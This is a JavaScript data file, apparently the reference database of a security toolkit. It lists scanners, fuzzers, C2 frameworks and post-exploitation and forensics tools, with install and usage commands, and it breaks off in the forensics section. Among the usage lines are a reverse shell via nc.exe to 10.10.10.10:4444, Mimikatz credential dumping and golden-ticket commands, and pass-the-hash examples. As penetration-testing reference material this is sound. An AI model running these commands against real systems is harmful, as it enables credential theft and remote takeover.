// Darknode Security Tools Reference Database
// Comprehensive reference for 200+ security tools
// Each entry: name, category, description, install, usage, advancedFlags, outputFormat, integrations, url

export const SECURITY_TOOLS_REF = [
  // ═══════════════════════════════════════════════════════════
  // SCANNERS
  // ═══════════════════════════════════════════════════════════
  {
    name: "Nmap",
    category: "scanners",
    description: "The de facto network scanner — port scanning, service detection, OS fingerprinting, and NSE scripting engine with 600+ scripts",
    install: "sudo apt install nmap",
    usage: [
      "nmap -sS -sV -O -p- <target>",
      "nmap --script=vuln <target>",
      "nmap -sU --top-ports 200 <target>"
    ],
    advancedFlags: [
      { flag: "-sS", desc: "TCP SYN scan (stealth, default for root)" },
      { flag: "-sV", desc: "Probe open ports for service/version info" },
      { flag: "-O", desc: "Enable OS detection" },
      { flag: "-A", desc: "Aggressive scan (OS, version, script, traceroute)" },
      { flag: "--script", desc: "Run NSE scripts (e.g., vuln, auth, exploit)" },
      { flag: "-T0-5", desc: "Timing template (0=paranoid, 5=insane)" },
      { flag: "-D RND:N", desc: "Use N random decoy IPs" },
      { flag: "-f", desc: "Fragment packets to bypass firewalls" },
      { flag: "--data-length N", desc: "Append N bytes of random data" },
      { flag: "-sn", desc: "Host discovery only (no port scan)" },
      { flag: "-Pn", desc: "Skip host discovery, scan directly" }
    ],
    outputFormat: "text, XML (-oX), grepable (-oG), JSON (-oJ via script), all formats (-oA)",
    integrations: ["Metasploit", "Searchsploit", "OpenVAS", "Nuclei"],
    url: "https://nmap.org"
  },
  {
    name: "Masscan",
    category: "scanners",
    description: "Internet-scale port scanner — scans the entire IPv4 space in under 6 minutes at 10M pps. Asynchronous SYN scanning with banner grabbing",
    install: "sudo apt install masscan",
    usage: [
      "masscan -p1-65535 --rate=1000 <target>/24",
      "masscan -p80,443 10.0.0.0/8 --rate=10000 --banners"
    ],
    advancedFlags: [
      { flag: "--rate", desc: "Packets per second" },
      { flag: "--banners", desc: "Grab service banners" },
      { flag: "-e", desc: "Network interface to use" },
      { flag: "--adapter-port", desc: "Source port for SYN packets" },
      { flag: "--excludefile", desc: "File of IPs/ranges to skip" },
      { flag: "-pU:", desc: "UDP port specification" }
    ],
    outputFormat: "binary (default), JSON (-oJ), XML (-oX), list (-oL), grepable (-oG)",
    integrations: ["Nmap (for deeper service probing)", "Nuclei"],
    url: "https://github.com/robertdavidgraham/masscan"
  },
  {
    name: "Rustscan",
    category: "scanners",
    description: "Extremely fast port scanner written in Rust that automatically pipes results to Nmap for service detection",
    install: "cargo install rustscan",
    usage: [
      "rustscan -a <target> -- -sV -sC",
      "rustscan -a <target> -r 1-65535 --batch-size 4500"
    ],
    advancedFlags: [
      { flag: "-a", desc: "Target address(es)" },
      { flag: "-r", desc: "Port range" },
      { flag: "--batch-size", desc: "Ports per batch (default 4500)" },
      { flag: "--timeout", desc: "Connection timeout in ms" },
      { flag: "--ulimit", desc: "File descriptor limit" },
      { flag: "--", desc: "Separator for nmap args" }
    ],
    outputFormat: "text with nmap output",
    integrations: ["Nmap"],
    url: "https://github.com/RustScan/RustScan"
  },
  {
    name: "Nuclei",
    category: "scanners",
    description: "Fast, template-based vulnerability scanner with 8000+ community templates covering CVEs, misconfigurations, exposures, and more",
    install: "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
    usage: [
      "nuclei -u https://target.com -as",
      "nuclei -l urls.txt -t cves/ -severity critical,high",
      "nuclei -u https://target.com -headless"
    ],
    advancedFlags: [
      { flag: "-u/-l", desc: "Single target / target list file" },
      { flag: "-t", desc: "Template files/directories" },
      { flag: "-as", desc: "Auto-detect tech stack and scan" },
      { flag: "-severity", desc: "Filter by severity (info,low,medium,high,critical)" },
      { flag: "-rl", desc: "Rate limit (requests per second)" },
      { flag: "-c", desc: "Concurrency (parallel templates)" },
      { flag: "-headless", desc: "Enable headless browser scanning" },
      { flag: "-tags", desc: "Filter templates by tag" },
      { flag: "-exclude-tags", desc: "Exclude templates by tag" }
    ],
    outputFormat: "text, JSON (-j), SARIF, Markdown",
    integrations: ["httpx", "subfinder", "ProjectDiscovery Cloud"],
    url: "https://github.com/projectdiscovery/nuclei"
  },
  {
    name: "OpenVAS (Greenbone)",
    category: "scanners",
    description: "Full-featured open-source vulnerability scanner with 80,000+ vulnerability tests. Enterprise-grade scanning with compliance checks",
    install: "sudo apt install gvm && gvm-setup",
    usage: [
      "gvm-cli socket --gmp-username admin --gmp-password admin --xml '<create_target>...'",
      "openvas-manage-certs -a"
    ],
    advancedFlags: [
      { flag: "gvm-cli", desc: "GMP protocol CLI interface" },
      { flag: "--xml", desc: "GMP XML commands" },
      { flag: "scan config", desc: "Full and fast, Discovery, System Discovery" }
    ],
    outputFormat: "XML, HTML, CSV, PDF, TXT reports",
    integrations: ["Metasploit", "Nmap", "SIEM systems"],
    url: "https://www.greenbone.net/en/community-edition/"
  },
  {
    name: "Nikto",
    category: "scanners",
    description: "Web server vulnerability scanner — checks for 6700+ dangerous files, outdated servers, and version-specific problems",
    install: "sudo apt install nikto",
    usage: [
      "nikto -h https://target.com",
      "nikto -h target.com -Tuning x67 -Plugins outdated,headers"
    ],
    advancedFlags: [
      { flag: "-h", desc: "Target host" },
      { flag: "-p", desc: "Target port" },
      { flag: "-ssl", desc: "Force SSL mode" },
      { flag: "-Tuning", desc: "Scan tuning (1-0,a-c,x)" },
      { flag: "-Plugins", desc: "Select specific plugins" },
      { flag: "-Format", desc: "Report format (html, csv, xml)" },
      { flag: "-maxtime", desc: "Max scan time in seconds" },
      { flag: "-useproxy", desc: "Route through proxy" }
    ],
    outputFormat: "text, HTML, CSV, XML",
    integrations: ["Burp Suite", "OWASP ZAP"],
    url: "https://cirt.net/Nikto2"
  },
  {
    name: "Nessus",
    category: "scanners",
    description: "Commercial vulnerability scanner with 100,000+ plugins. Industry standard for compliance scanning and vulnerability assessment",
    install: "Download from tenable.com (Nessus Essentials is free for 16 IPs)",
    usage: [
      "Access via web UI at https://localhost:8834",
      "/opt/nessus/sbin/nessuscli update"
    ],
    advancedFlags: [
      { flag: "Basic Network Scan", desc: "Full scan for common vulnerabilities" },
      { flag: "Advanced Scan", desc: "Custom scan with fine-grained control" },
      { flag: "Compliance", desc: "CIS, DISA STIG, PCI DSS checks" },
      { flag: "Credentialed", desc: "Authenticated scan with SSH/WinRM creds" }
    ],
    outputFormat: "HTML, CSV, Nessus XML (plugin output)",
    integrations: ["Splunk", "ServiceNow", "JIRA"],
    url: "https://www.tenable.com/products/nessus"
  },

  // ═══════════════════════════════════════════════════════════
  // FUZZERS
  // ═══════════════════════════════════════════════════════════
  {
    name: "ffuf",
    category: "fuzzers",
    description: "Fast web fuzzer written in Go — directory brute-force, virtual host discovery, parameter fuzzing, POST data fuzzing",
    install: "go install github.com/ffuf/ffuf/v2@latest",
    usage: [
      "ffuf -u https://target.com/FUZZ -w wordlist.txt",
      "ffuf -u https://target.com -H 'Host: FUZZ.target.com' -w subs.txt",
      "ffuf -u https://target.com/login -X POST -d 'user=admin&pass=FUZZ' -w passwords.txt"
    ],
    advancedFlags: [
      { flag: "-u", desc: "Target URL (FUZZ keyword marks injection point)" },
      { flag: "-w", desc: "Wordlist" },
      { flag: "-mc", desc: "Match HTTP status codes" },
      { flag: "-fc", desc: "Filter (exclude) status codes" },
      { flag: "-fs", desc: "Filter by response size" },
      { flag: "-fr", desc: "Filter by regex pattern" },
      { flag: "-e", desc: "Extensions to append (.php,.asp,.html)" },
      { flag: "-t", desc: "Number of threads (default 40)" },
      { flag: "-recursion", desc: "Enable recursive scanning" },
      { flag: "-replay-proxy", desc: "Send matched results through proxy" }
    ],
    outputFormat: "text, JSON (-of json), CSV (-of csv), Markdown (-of md)",
    integrations: ["Burp Suite (via proxy)", "Nuclei"],
    url: "https://github.com/ffuf/ffuf"
  },
  {
    name: "Gobuster",
    category: "fuzzers",
    description: "Directory, DNS, VHost, S3, GCS, and TFTP brute-force tool written in Go",
    install: "go install github.com/OJ/gobuster/v3@latest",
    usage: [
      "gobuster dir -u https://target.com -w wordlist.txt -x php,html",
      "gobuster dns -d target.com -w subdomains.txt",
      "gobuster vhost -u https://target.com -w vhosts.txt"
    ],
    advancedFlags: [
      { flag: "dir", desc: "Directory/file brute-force mode" },
      { flag: "dns", desc: "DNS subdomain brute-force mode" },
      { flag: "vhost", desc: "Virtual host discovery mode" },
      { flag: "s3", desc: "AWS S3 bucket enumeration mode" },
      { flag: "-t", desc: "Number of threads" },
      { flag: "-x", desc: "File extensions to search" },
      { flag: "-k", desc: "Skip TLS verification" },
      { flag: "-r", desc: "Follow redirects" },
      { flag: "--wildcard", desc: "Force processing on wildcard domains" }
    ],
    outputFormat: "text, JSON",
    integrations: ["Nmap", "Burp Suite"],
    url: "https://github.com/OJ/gobuster"
  },
  {
    name: "Wfuzz",
    category: "fuzzers",
    description: "Flexible web application fuzzer with support for multiple injection points, cookies, authentication, and request chaining",
    install: "pip install wfuzz",
    usage: [
      "wfuzz -c -z file,wordlist.txt --hc 404 https://target.com/FUZZ",
      "wfuzz -c -z range,1-1000 --hl 0 https://target.com/api/user/FUZZ"
    ],
    advancedFlags: [
      { flag: "-c", desc: "Colorized output" },
      { flag: "-z", desc: "Payload specification (file, range, list)" },
      { flag: "--hc", desc: "Hide responses with status code" },
      { flag: "--hl", desc: "Hide responses with line count" },
      { flag: "--hw", desc: "Hide responses with word count" },
      { flag: "--hh", desc: "Hide responses with char count" },
      { flag: "-p", desc: "Proxy (host:port:type)" },
      { flag: "-b", desc: "Cookie string" },
      { flag: "-H", desc: "Custom header" }
    ],
    outputFormat: "text, JSON, HTML",
    integrations: ["Burp Suite"],
    url: "https://github.com/xmendez/wfuzz"
  },
  {
    name: "Feroxbuster",
    category: "fuzzers",
    description: "Fast, recursive content discovery tool written in Rust. Auto-filters by response size, auto-recurse into found directories",
    install: "sudo apt install feroxbuster",
    usage: [
      "feroxbuster -u https://target.com -w wordlist.txt",
      "feroxbuster -u https://target.com --smart -x php,html,js --depth 4"
    ],
    advancedFlags: [
      { flag: "-u", desc: "Target URL" },
      { flag: "-w", desc: "Wordlist" },
      { flag: "-x", desc: "File extensions" },
      { flag: "--depth", desc: "Recursion depth (default 4)" },
      { flag: "--smart", desc: "Auto-filter by analyzing responses" },
      { flag: "-t", desc: "Thread count" },
      { flag: "--burp", desc: "Proxy through Burp Suite" },
      { flag: "--resume-from", desc: "Resume from state file" }
    ],
    outputFormat: "text, JSON",
    integrations: ["Burp Suite"],
    url: "https://github.com/epi052/feroxbuster"
  },
  {
    name: "Dirsearch",
    category: "fuzzers",
    description: "Web path brute-forcer with threading, proxy support, and smart recursive scanning",
    install: "pip install dirsearch",
    usage: [
      "dirsearch -u https://target.com -e php,html,js",
      "dirsearch -u https://target.com --deep-recursive --force-recursive"
    ],
    advancedFlags: [
      { flag: "-u", desc: "Target URL" },
      { flag: "-e", desc: "Extensions" },
      { flag: "-w", desc: "Custom wordlist" },
      { flag: "--deep-recursive", desc: "Brute-force each found directory" },
      { flag: "--force-recursive", desc: "Force recursion on all directories" },
      { flag: "-t", desc: "Thread count" },
      { flag: "--proxy", desc: "HTTP proxy" },
      { flag: "-x", desc: "Exclude status codes" }
    ],
    outputFormat: "text, JSON, CSV, Markdown, XML",
    integrations: ["Burp Suite"],
    url: "https://github.com/maurosoria/dirsearch"
  },
  {
    name: "ParamSpider",
    category: "fuzzers",
    description: "Mining parameters from web archives (Wayback Machine) for targeted fuzzing",
    install: "pip install paramspider",
    usage: [
      "paramspider -d target.com",
      "paramspider -d target.com --exclude woff,css,js,png,jpg"
    ],
    advancedFlags: [
      { flag: "-d", desc: "Target domain" },
      { flag: "--exclude", desc: "Exclude file extensions" },
      { flag: "--level", desc: "Depth of crawling" },
      { flag: "-o", desc: "Output file" }
    ],
    outputFormat: "text (URL list)",
    integrations: ["ffuf", "Nuclei", "sqlmap"],
    url: "https://github.com/devanshbatham/ParamSpider"
  },
  {
    name: "Arjun",
    category: "fuzzers",
    description: "HTTP parameter discovery tool that finds hidden GET/POST parameters using intelligent wordlist-based probing",
    install: "pip install arjun",
    usage: [
      "arjun -u https://target.com/endpoint",
      "arjun -u https://target.com/api -m POST --json"
    ],
    advancedFlags: [
      { flag: "-u", desc: "Target URL" },
      { flag: "-m", desc: "HTTP method (GET/POST/JSON)" },
      { flag: "--json", desc: "Use JSON body for POST" },
      { flag: "-w", desc: "Custom wordlist" },
      { flag: "-t", desc: "Thread count" },
      { flag: "--headers", desc: "Custom headers file" }
    ],
    outputFormat: "text, JSON",
    integrations: ["Burp Suite", "ffuf"],
    url: "https://github.com/s0md3v/Arjun"
  },

  // ═══════════════════════════════════════════════════════════
  // EXPLOIT FRAMEWORKS
  // ═══════════════════════════════════════════════════════════
  {
    name: "Metasploit Framework",
    category: "exploit-frameworks",
    description: "The world's most used penetration testing framework — 2,000+ exploits, 1,000+ auxiliary modules, payloads, encoders, and post-exploitation modules",
    install: "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall",
    usage: [
      "msfconsole",
      "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <ip>; exploit",
      "search type:exploit platform:windows cve:2021"
    ],
    advancedFlags: [
      { flag: "search", desc: "Search modules by type, platform, CVE, name" },
      { flag: "use", desc: "Select a module" },
      { flag: "set/setg", desc: "Set module options (setg = global)" },
      { flag: "exploit/run", desc: "Execute the module" },
      { flag: "-j", desc: "Run as background job" },
      { flag: "sessions", desc: "List active sessions" },
      { flag: "route", desc: "Add route for pivoting" },
      { flag: "spool", desc: "Log console output to file" }
    ],
    outputFormat: "console output, loot files, database entries",
    integrations: ["Nmap", "Nessus", "CobaltStrike", "PostgreSQL"],
    url: "https://www.metasploit.com"
  },
  {
    name: "Cobalt Strike",
    category: "exploit-frameworks",
    description: "Commercial adversary simulation and red team operations platform. Beacon payloads, malleable C2, and team collaboration",
    install: "Commercial license from fortra.com/cobalt-strike",
    usage: [
      "teamserver <ip> <password>",
      "Listeners > Add > HTTPS Beacon",
      "Attacks > Packages > Windows Executable (S)"
    ],
    advancedFlags: [
      { flag: "Beacon", desc: "Asynchronous C2 agent" },
      { flag: "Malleable C2", desc: "Customize network traffic signatures" },
      { flag: "BOF", desc: "Beacon Object Files for in-memory execution" },
      { flag: "SOCKS proxy", desc: "Pivot through beacon" },
      { flag: "sleep", desc: "Set callback interval" }
    ],
    outputFormat: "Team Server logs, activity reports, IOC export",
    integrations: ["Mimikatz", "SharpHound", "PowerView"],
    url: "https://www.cobaltstrike.com"
  },
  {
    name: "Sliver",
    category: "exploit-frameworks",
    description: "Open-source C2 framework — cross-platform implants (Go), encrypted C2, pivoting, BOF support, and multi-user",
    install: "curl https://sliver.sh/install | sudo bash",
    usage: [
      "sliver > generate --http 10.10.10.10 -s /tmp/implant",
      "sliver > https --lhost 10.10.10.10 --lport 443",
      "sliver > use <session-id>"
    ],
    advancedFlags: [
      { flag: "generate", desc: "Create implant (--http, --https, --mtls, --dns)" },
      { flag: "--os", desc: "Target OS (windows, linux, darwin)" },
      { flag: "--arch", desc: "Architecture (amd64, arm64, 386)" },
      { flag: "pivots", desc: "Create pivot listeners through implants" },
      { flag: "armory", desc: "Install extension packages (BOFs, tools)" }
    ],
    outputFormat: "console, JSON (--json), loot storage",
    integrations: ["CobaltStrike BOFs (via armory)", "Metasploit sessions"],
    url: "https://github.com/BishopFox/sliver"
  },
  {
    name: "Havoc",
    category: "exploit-frameworks",
    description: "Modern C2 framework with a clean GUI. Supports x64 agents (Demon), BOFs, .NET assembly loading, and team collaboration",
    install: "git clone https://github.com/HavocFramework/Havoc && make",
    usage: [
      "havoc server --profile ./profiles/havoc.yaotl",
      "Generate payload via GUI: Payloads > Generate"
    ],
    advancedFlags: [
      { flag: "Demon", desc: "Primary agent with SMB/HTTP/HTTPS channels" },
      { flag: "BOFs", desc: "Run Beacon Object Files in-memory" },
      { flag: ".NET", desc: "Load and execute .NET assemblies" },
      { flag: "Sleep obfuscation", desc: "Evasive sleep techniques" }
    ],
    outputFormat: "GUI-based logs and loot",
    integrations: ["CobaltStrike BOFs", "SharpCollection tools"],
    url: "https://github.com/HavocFramework/Havoc"
  },
  {
    name: "Empire",
    category: "exploit-frameworks",
    description: "Post-exploitation and adversary emulation framework. PowerShell and Python agents with 400+ modules",
    install: "git clone https://github.com/BC-SECURITY/Empire && cd Empire && ./setup/install.sh",
    usage: [
      "server --restport 1337",
      "client",
      "uselistener http && set Host https://10.10.10.10 && execute"
    ],
    advancedFlags: [
      { flag: "uselistener", desc: "Configure C2 listener" },
      { flag: "usestager", desc: "Generate agent delivery" },
      { flag: "usemodule", desc: "Run post-exploitation module" },
      { flag: "interact", desc: "Interact with active agent" }
    ],
    outputFormat: "console output, REST API JSON",
    integrations: ["DeathStar (automated AD attack)", "Starkiller (GUI)"],
    url: "https://github.com/BC-SECURITY/Empire"
  },

  // ═══════════════════════════════════════════════════════════
  // POST-EXPLOITATION
  // ═══════════════════════════════════════════════════════════
  {
    name: "Mimikatz",
    category: "post-exploitation",
    description: "Windows credential extraction — dump plaintext passwords, NTLM hashes, Kerberos tickets, and perform Golden/Silver ticket attacks from LSASS memory",
    install: "Download from https://github.com/gentilkiwi/mimikatz/releases",
    usage: [
      "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
      "mimikatz.exe \"lsadump::dcsync /domain:corp.local /user:Administrator\" exit",
      "mimikatz.exe \"kerberos::golden /user:Admin /domain:corp.local /sid:<SID> /krbtgt:<hash> /ptt\" exit"
    ],
    advancedFlags: [
      { flag: "sekurlsa::logonpasswords", desc: "Dump all credential material from LSASS" },
      { flag: "lsadump::dcsync", desc: "DCSync — replicate DC to extract hashes" },
      { flag: "lsadump::sam", desc: "Dump local SAM database" },
      { flag: "kerberos::golden", desc: "Create Golden Ticket" },
      { flag: "kerberos::silver", desc: "Create Silver Ticket" },
      { flag: "sekurlsa::pth", desc: "Pass-the-Hash attack" },
      { flag: "crypto::certificates", desc: "Export certificates and private keys" },
      { flag: "vault::cred", desc: "Dump Windows Credential Manager" }
    ],
    outputFormat: "console text output",
    integrations: ["Metasploit (load kiwi)", "CobaltStrike (inline)", "Empire"],
    url: "https://github.com/gentilkiwi/mimikatz"
  },
  {
    name: "Rubeus",
    category: "post-exploitation",
    description: "C# toolset for Kerberos interaction and abuse — Kerberoasting, AS-REP Roasting, ticket manipulation, S4U delegation abuse",
    install: "Compile from https://github.com/GhostPack/Rubeus or use precompiled",
    usage: [
      "Rubeus.exe kerberoast /outfile:hashes.txt",
      "Rubeus.exe asreproast /format:hashcat",
      "Rubeus.exe s4u /user:machine$ /rc4:<hash> /impersonateuser:Admin /msdsspn:cifs/target /ptt"
    ],
    advancedFlags: [
      { flag: "kerberoast", desc: "Request and dump TGS tickets" },
      { flag: "asreproast", desc: "Find/exploit users without pre-auth" },
      { flag: "s4u", desc: "S4U constrained delegation abuse" },
      { flag: "ptt", desc: "Pass-the-ticket (inject into session)" },
      { flag: "dump", desc: "Dump all Kerberos tickets" },
      { flag: "monitor", desc: "Monitor for new TGTs" },
      { flag: "harvest", desc: "Harvest TGTs on interval" }
    ],
    outputFormat: "console text, .kirbi ticket files",
    integrations: ["Mimikatz", "BloodHound", "CobaltStrike (execute-assembly)"],
    url: "https://github.com/GhostPack/Rubeus"
  },
  {
    name: "CrackMapExec (NetExec)",
    category: "post-exploitation",
    description: "Swiss-army knife for network pentesting — credential testing, share enumeration, command execution across SMB, WinRM, LDAP, SSH, MSSQL, RDP",
    install: "pip install crackmapexec",
    usage: [
      "crackmapexec smb 192.168.1.0/24 -u admin -p 'Pass123' --shares",
      "crackmapexec smb 192.168.1.10 -u admin -H '<hash>' --sam",
      "crackmapexec winrm 192.168.1.0/24 -u admin -p 'Pass123'"
    ],
    advancedFlags: [
      { flag: "smb/winrm/ldap/ssh/mssql/rdp", desc: "Protocol selection" },
      { flag: "-u/-p", desc: "Username/password" },
      { flag: "-H", desc: "NTLM hash (pass-the-hash)" },
      { flag: "--shares", desc: "Enumerate shares" },
      { flag: "--sam", desc: "Dump SAM database" },
      { flag: "--lsa", desc: "Dump LSA secrets" },
      { flag: "-x/-X", desc: "Execute cmd/PowerShell command" },
      { flag: "--ntds", desc: "Dump NTDS.dit (via DCSync or VSS)" },
      { flag: "-M", desc: "Run module (e.g., mimikatz, petitpotam)" }
    ],
    outputFormat: "console text, cmedb database",
    integrations: ["BloodHound", "Metasploit", "Mimikatz"],
    url: "https://github.com/Pennyw0rth/NetExec"
  },
  {
    name: "Impacket",
    category: "post-exploitation",
    description: "Python collection of network protocol implementations — PSExec, WMIExec, SMBExec, SecretsDump, GetNPUsers, GetUserSPNs, NTLMRelayx, and more",
    install: "pip install impacket",
    usage: [
      "impacket-psexec domain/user:pass@target",
      "impacket-secretsdump domain/user:pass@target -just-dc-ntlm",
      "impacket-GetUserSPNs domain/user:pass -dc-ip DC -request"
    ],
    advancedFlags: [
      { flag: "psexec", desc: "Remote shell via SMB service creation (SYSTEM)" },
      { flag: "wmiexec", desc: "Remote shell via WMI (stealthier)" },
      { flag: "smbexec", desc: "Remote shell via SMB (no file on disk)" },
      { flag: "secretsdump", desc: "Extract SAM/NTDS/LSA credentials" },
      { flag: "ntlmrelayx", desc: "NTLM relay attacks" },
      { flag: "GetNPUsers", desc: "AS-REP Roasting" },
      { flag: "GetUserSPNs", desc: "Kerberoasting" },
      { flag: "ticketer", desc: "Create Golden/Silver tickets" },
      { flag: "addcomputer", desc: "Add machine account via LDAP" }
    ],
    outputFormat: "console text, extracted hash files",
    integrations: ["Responder", "Mimikatz", "BloodHound"],
    url: "https://github.com/fortra/impacket"
  },
  {
    name: "Evil-WinRM",
    category: "post-exploitation",
    description: "Windows Remote Management shell with pass-the-hash, file upload/download, DLL/PS script loading, and .NET assembly execution",
    install: "gem install evil-winrm",
    usage: [
      "evil-winrm -i 192.168.1.10 -u admin -p 'Pass123'",
      "evil-winrm -i 192.168.1.10 -u admin -H '<hash>' -s /scripts -e /exes"
    ],
    advancedFlags: [
      { flag: "-i", desc: "Target IP" },
      { flag: "-u/-p", desc: "Username/password" },
      { flag: "-H", desc: "NTLM hash" },
      { flag: "-s", desc: "PowerShell scripts directory" },
      { flag: "-e", desc: "Executables directory" },
      { flag: "-S", desc: "Enable SSL" },
      { flag: "menu", desc: "In-session: list loaded capabilities" },
      { flag: "upload/download", desc: "In-session file transfer" }
    ],
    outputFormat: "interactive PowerShell console",
    integrations: ["Mimikatz", "SharpHound", "Rubeus"],
    url: "https://github.com/Hackplayers/evil-winrm"
  },
  {
    name: "BloodHound",
    category: "post-exploitation",
    description: "Active Directory attack path analysis tool using graph theory. Reveals hidden relationships and attack paths to Domain Admin",
    install: "Download from https://github.com/SpecterOps/BloodHound/releases",
    usage: [
      "SharpHound.exe --CollectionMethods All",
      "bloodhound-python -c All -d corp.local -u user -p pass -ns DC_IP",
      "Import data into BloodHound GUI"
    ],
    advancedFlags: [
      { flag: "--CollectionMethods All", desc: "Collect all AD data (users, groups, sessions, ACLs, trusts)" },
      { flag: "Shortest Path to DA", desc: "GUI: find shortest attack path to Domain Admins" },
      { flag: "Owned Principals", desc: "Mark compromised accounts to find paths from them" },
      { flag: "Custom Cypher", desc: "Write Neo4j Cypher queries for custom analysis" }
    ],
    outputFormat: "JSON data files, Neo4j graph database",
    integrations: ["SharpHound", "bloodhound-python", "PlumHound", "Max (BloodHound CE)"],
    url: "https://github.com/SpecterOps/BloodHound"
  },
  {
    name: "Chisel",
    category: "post-exploitation",
    description: "Fast TCP/UDP tunnel over HTTP with SSH encryption. Single binary, no dependencies — ideal for pivoting through firewalls",
    install: "go install github.com/jpillora/chisel@latest",
    usage: [
      "chisel server --reverse --port 8080",
      "chisel client 10.10.10.10:8080 R:socks",
      "chisel client 10.10.10.10:8080 R:3389:172.16.1.10:3389"
    ],
    advancedFlags: [
      { flag: "server --reverse", desc: "Server mode accepting reverse connections" },
      { flag: "R:socks", desc: "Reverse SOCKS5 proxy" },
      { flag: "R:local:remote", desc: "Reverse port forward" },
      { flag: "--auth", desc: "Set username:password" },
      { flag: "--keepalive", desc: "Keepalive interval" }
    ],
    outputFormat: "console logs",
    integrations: ["proxychains", "Nmap (via SOCKS)", "Metasploit"],
    url: "https://github.com/jpillora/chisel"
  },
  {
    name: "Ligolo-ng",
    category: "post-exploitation",
    description: "Advanced tunneling/pivoting tool using a TUN interface — creates a virtual network adapter for seamless access to internal networks",
    install: "Download from https://github.com/nicocha30/ligolo-ng/releases",
    usage: [
      "ligolo-proxy -selfcert -laddr 0.0.0.0:11601",
      "ligolo-agent -connect 10.10.10.10:11601 -ignore-cert",
      "session; start; listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444"
    ],
    advancedFlags: [
      { flag: "-selfcert", desc: "Auto-generate self-signed certificate" },
      { flag: "-laddr", desc: "Listen address for agent connections" },
      { flag: "session", desc: "Select active agent session" },
      { flag: "start", desc: "Start tunnel" },
      { flag: "listener_add", desc: "Add port forward through tunnel" }
    ],
    outputFormat: "console logs",
    integrations: ["ip route (Linux routing)", "Nmap", "CrackMapExec"],
    url: "https://github.com/nicocha30/ligolo-ng"
  },
  {
    name: "LinPEAS",
    category: "post-exploitation",
    description: "Linux Privilege Escalation Awesome Script — comprehensive local enumeration for Linux/macOS covering SUID, capabilities, cron, processes, and known CVEs",
    install: "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh",
    usage: [
      "chmod +x linpeas.sh && ./linpeas.sh",
      "./linpeas.sh -a 2>&1 | tee linpeas.txt"
    ],
    advancedFlags: [
      { flag: "-a", desc: "All checks (longer, more thorough)" },
      { flag: "-s", desc: "Super fast (minimal checks)" },
      { flag: "-P", desc: "Password to test" },
      { flag: "-D", desc: "Debug mode" }
    ],
    outputFormat: "colorized console text",
    integrations: ["GTFOBins", "CVE databases"],
    url: "https://github.com/peass-ng/PEASS-ng"
  },
  {
    name: "WinPEAS",
    category: "post-exploitation",
    description: "Windows Privilege Escalation Awesome Script — enumerate unquoted paths, service misconfigs, credentials, AlwaysInstallElevated, and more",
    install: "Download from https://github.com/peass-ng/PEASS-ng/releases",
    usage: [
      "winPEASx64.exe",
      "winPEASx64.exe quiet servicesinfo applicationsinfo"
    ],
    advancedFlags: [
      { flag: "quiet", desc: "Minimal output" },
      { flag: "servicesinfo", desc: "Check service configurations" },
      { flag: "applicationsinfo", desc: "Check installed applications" },
      { flag: "systeminfo", desc: "System information checks" },
      { flag: "userinfo", desc: "User privilege checks" },
      { flag: "windowscreds", desc: "Windows credential checks" }
    ],
    outputFormat: "colorized console text, HTML",
    integrations: ["LOLBAS", "CVE databases"],
    url: "https://github.com/peass-ng/PEASS-ng"
  },
  {
    name: "PrintSpoofer",
    category: "post-exploitation",
    description: "Exploit SeImpersonatePrivilege to escalate from service accounts to SYSTEM on Windows 10/Server 2016+",
    install: "Download from https://github.com/itm4n/PrintSpoofer/releases",
    usage: [
      "PrintSpoofer64.exe -i -c cmd",
      "PrintSpoofer64.exe -c 'C:\\temp\\nc.exe 10.10.10.10 4444 -e cmd'"
    ],
    advancedFlags: [
      { flag: "-i", desc: "Interactive mode" },
      { flag: "-c", desc: "Command to run as SYSTEM" },
      { flag: "-d", desc: "RPC server delay" }
    ],
    outputFormat: "console (SYSTEM shell)",
    integrations: ["Metasploit meterpreter", "CobaltStrike"],
    url: "https://github.com/itm4n/PrintSpoofer"
  },
  {
    name: "GodPotato",
    category: "post-exploitation",
    description: "Universal potato exploit — works on all Windows versions from Windows 8 to Windows 11 and Server 2012 to 2022 for SeImpersonatePrivilege escalation",
    install: "Download from https://github.com/BeichenDream/GodPotato/releases",
    usage: [
      "GodPotato.exe -cmd 'cmd /c whoami'",
      "GodPotato.exe -cmd 'cmd /c C:\\temp\\shell.exe'"
    ],
    advancedFlags: [
      { flag: "-cmd", desc: "Command to execute as SYSTEM" }
    ],
    outputFormat: "console text",
    integrations: ["Metasploit", "CobaltStrike"],
    url: "https://github.com/BeichenDream/GodPotato"
  },

  // ═══════════════════════════════════════════════════════════
  // FORENSICS
  // ═══════════════════════════════════════════════════════════
  {
    name: "Volatility 3",
    category: "forensics",
    description: "Advanced memory forensics framework — analyze RAM dumps for malware, rootkits, processes, network connections, registry hives, and credentials",
    install: "pip install volatility3",
    usage: [
      "vol -f memory.dmp windows.pslist",
      "vol -f memory.dmp windows.netscan",
      "vol -f memory.dmp windows.filescan"
    ],
    advancedFlags: [
      { flag: "windows.pslist", desc: "List running processes" },
      { flag: "windows.psscan", desc: "Scan for hidden processes" },
      { flag: "windows.netscan", desc: "Network connections" },
      { flag: "windows.malfind", desc: "Find injected code" },
      { flag: "windows.dlllist", desc: "Loaded DLLs per process" },
      { flag: "windows.handles", desc: "Open handles" },
      { flag: "windows.hashdump", desc: "Extract password hashes" },
      { flag: "windows.cmdline", desc: "Command-line arguments" },
      { flag: "linux.pslist", desc: "Linux process listing" },
      { flag: "linux.bash", desc: "Bash history from memory" }
    ],
    outputFormat: "text, CSV, JSON (via renderers)",
    integrations: ["YARA", "VirusTotal", "MISP"],
    url: "https://github.com/volatilityfoundation/volatility3"
  },
  {
    name: "Autopsy",
    category: "forensics",
    description: "Digital forensics platform — disk analysis, file carving, timeline analysis, hash lookup, keyword search, web artifacts, email analysis",
    install: "sudo apt install autopsy sleuthkit",
    usage: [
      "autopsy (web UI on port 9999)",
      "Access via browser at http://localhost:9999/autopsy"
    ],
    advancedFlags: [
      { flag: "File Analysis", desc: "NTFS/FAT/ext analysis, slack space, deleted files" },
      { flag: "Timeline", desc: "Generate chronological activity timeline" },
